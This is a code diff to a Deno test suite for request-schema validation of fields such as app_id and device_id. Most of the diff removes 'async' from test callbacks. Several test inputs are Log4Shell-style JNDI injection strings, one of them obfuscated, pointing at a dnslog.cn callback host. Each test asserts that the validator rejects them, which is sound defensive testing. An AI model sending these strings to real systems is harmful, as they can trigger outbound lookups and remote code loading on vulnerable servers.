@@ -109,26 +109,26 @@ const requestJSON: RequestJSON = {
 }
 
 const schemas = [updateRequestSchema, statsRequestSchema]
-let index: number = 1
+let index = 1
 for (const schema of schemas) {
   Deno.test({
     name: `test app_id ${getSuffix(index)}`,
     only: false,
     async fn(t) {
-      await t.step('app_id missing', async () => {
+      await t.step('app_id missing', () => {
         const body = getJSON()
         delete body.app_id
         assertEquals(body.app_id, undefined)
         const response = parseJSON(body, schema)
         assertStatements(response, MISSING_STRING_APP_ID)
       })
-      await t.step('app_id with underscore is valid', async () => {
+      await t.step('app_id with underscore is valid', () => {
         const body = getJSON()
         body.app_id = 'ee.forgr.demo_app'
         const response = parseJSON(body, schema)
         assertEquals(response, NO_ERROR)
       })
-      await t.step('app_id with hyphen is valid', async () => {
+      await t.step('app_id with hyphen is valid', () => {
         const body = getJSON()
         body.app_id = 'ee.forgr.demo-app'
         const response = parseJSON(body, schema)
@@ -136,7 +136,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'app_id invalid #1',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.app_id = 1000000000000000000000000000
           const response = parseJSON(body, schema)
@@ -145,7 +145,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'app_id invalid #2',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.app_id = ''
           const response = parseJSON(body, schema)
@@ -154,7 +154,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'app_id invalid #3',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.app_id = '.ee.forgr.demoapp'
           const response = parseJSON(body, schema)
@@ -163,7 +163,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'app_id invalid #4',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.app_id = 'eeforgrdemoapp'
           const response = parseJSON(body, schema)
@@ -172,20 +172,20 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'app_id invalid #5',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.app_id = 'app_${indi:${lower:I}${lower:d}a${lower:p}://1694362129451PrwrE.4q0tv0.dnslog.cn/nik}' // eslint-disable-line no-template-curly-in-string
           const response = parseJSON(body, schema)
           assertStatements(response, INVALID_STRING_APP_ID)
         },
       })
-      await t.step('app_id invalid #6', async () => {
+      await t.step('app_id invalid #6', () => {
         const body = getJSON()
         body.app_id = 'ee.forgr.demo+app'
         const response = parseJSON(body, schema)
         assertStatements(response, INVALID_STRING_APP_ID)
       })
-      await t.step('app_id invalid #7', async () => {
+      await t.step('app_id invalid #7', () => {
         const body = getJSON()
         body.app_id = '[appid]'
         const response = parseJSON(body, schema)
@@ -197,7 +197,7 @@ for (const schema of schemas) {
   Deno.test({
     name: `test device_id ${getSuffix(index)}`,
     async fn(t) {
-      await t.step('device_id missing', async () => {
+      await t.step('device_id missing', () => {
         const body = getJSON()
         delete body.device_id
         const response = parseJSON(body, schema)
@@ -205,7 +205,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'device_id invalid #1',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.device_id = 2_000_000_000
           const response = parseJSON(body, schema)
@@ -214,7 +214,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'device_id invalid #2',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.device_id = 'ECF1-4D7F-B0C1-A8CE463C6684'
           const response = parseJSON(body, schema)
@@ -223,7 +223,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'device_id invalid #3',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.device_id = '9929AFAD-4D7F-B0C1-A8CE463C6684'
           const response = parseJSON(body, schema)
@@ -232,7 +232,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'device_id invalid #4',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.device_id = '9929AFAD-ECF1-B0C1-A8CE463C6684'
           const response = parseJSON(body, schema)
@@ -241,7 +241,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'device_id invalid #5',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.device_id = '9929AFAD-ECF1-4D7F-B0C1-'
           const response = parseJSON(body, schema)
@@ -250,7 +250,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'device_id invalid #6',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.device_id = '9929AFADECF14D7FB0C1A8CE463C6684'
           const response = parseJSON(body, schema)
@@ -259,7 +259,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'device_id invalid #7',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.device_id = 'A243AFAD-ECF1-4D7F-B0C1-A8CE463C560'
           const response = parseJSON(body, schema)
@@ -268,7 +268,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'device_id invalid #8',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.device_id = ''
           const response = parseJSON(body, schema)
@@ -277,7 +277,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'device_id invalid #9',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.device_id = 'device_${jndi:ldap://1694362129451P}' // eslint-disable-line no-template-curly-in-string
           const response = parseJSON(body, schema)
@@ -286,7 +286,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'device_id length exceeded',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.device_id = 'device_${jndi:ldap://1694362129451PrwrE.4q0tv0.dnslog.cn/nik}' // eslint-disable-line no-template-curly-in-string
           const response = parseJSON(body, schema)
@@ -299,7 +299,7 @@ for (const schema of schemas) {
   Deno.test({
     name: `test version_name ${getSuffix(index)}`,
     async fn(t) {
-      await t.step('version_name missing', async () => {
+      await t.step('version_name missing', () => {
         const body = getJSON()
         delete body.version_name
         const response = parseJSON(body, schema)
@@ -307,7 +307,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'version_name invalid #1',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.version_name = 300000
           const response = parseJSON(body, schema)
@@ -316,7 +316,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'version_name invalid #2',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.version_name = true
           const response = parseJSON(body, schema)
@@ -329,7 +329,7 @@ for (const schema of schemas) {
   Deno.test({
     name: `test app_id and device_id ${getSuffix(index)}`,
     async fn(t) {
-      await t.step('app_id and device_id missing', async () => {
+      await t.step('app_id and device_id missing', () => {
         const body = getJSON()
         delete body.app_id
         delete body.device_id
@@ -339,7 +339,7 @@ for (const schema of schemas) {
       })
       await t.step({
         name: 'app_id and device_id are invalid',
-        fn: async () => {
+        fn: () => {
           const body = getJSON()
           body.app_id = '123456768'
           body.device_id = '${jndi:ldap://4q0tv0.dnslog.cn}' // eslint-disable-line no-template-curly-in-string
@@ -362,7 +362,7 @@ Deno.test({
   name: 'test version_build - /updates',
   only: false,
   async fn(t) {
-    await t.step('version_build missing', async () => {
+    await t.step('version_build missing', () => {
       const body = getJSON()
       delete body.version_build
       const response = parseJSON(body, updateRequestSchema)
@@ -370,7 +370,7 @@ Deno.test({
     })
     await t.step({
       name: 'version_build invalid #1',
-      fn: async () => {
+      fn: () => {
         const body = getJSON()
         body.version_build = 4000000
         const response = parseJSON(body, updateRequestSchema)
@@ -379,7 +379,7 @@ Deno.test({
     })
     await t.step({
       name: 'version_build invalid #2',
-      fn: async () => {
+      fn: () => {
         const body = getJSON()
         body.version_build = true
         const response = parseJSON(body, updateRequestSchema)
@@ -396,7 +396,7 @@ Deno.test({
   name: 'test version_os - /stats',
   only: false,
   async fn(t) {
-    await t.step('version_os missing', async () => {
+    await t.step('version_os missing', () => {
       const body = getJSON()
       delete body.version_os
       const response = parseJSON(body, statsRequestSchema)
@@ -404,7 +404,7 @@ Deno.test({
     })
     await t.step({
       name: 'version_os invalid #1',
-      fn: async () => {
+      fn: () => {
         const body = getJSON()
         body.version_os = -5000000
         const response = parseJSON(body, statsRequestSchema)
@@ -413,7 +413,7 @@ Deno.test({
     })
     await t.step({
       name: 'version_os invalid #2',
-      fn: async () => {
+      fn: () => {
         const body = getJSON()
         body.version_os = false
         const response = parseJSON(body, statsRequestSchema)
@@ -425,7 +425,7 @@ Deno.test({
 Deno.test({
   name: 'test platform - /stats',
   async fn(t) {
-    await t.step('platform missing', async () => {
+    await t.step('platform missing', () => {
       const body = getJSON()
       delete body.platform
       const response = parseJSON(body, statsRequestSchema)
@@ -433,7 +433,7 @@ Deno.test({
     })
     await t.step({
       name: 'platform invalid #1',
-      fn: async () => {
+      fn: () => {
         const body = getJSON()
         body.platform = -6000000
         const response = parseJSON(body, statsRequestSchema)
@@ -442,7 +442,7 @@ Deno.test({
     })
     await t.step({
       name: 'platform invalid #2',
-      fn: async () => {
+      fn: () => {
         const body = getJSON()
         body.platform = true
         const response = parseJSON(body, statsRequestSchema)
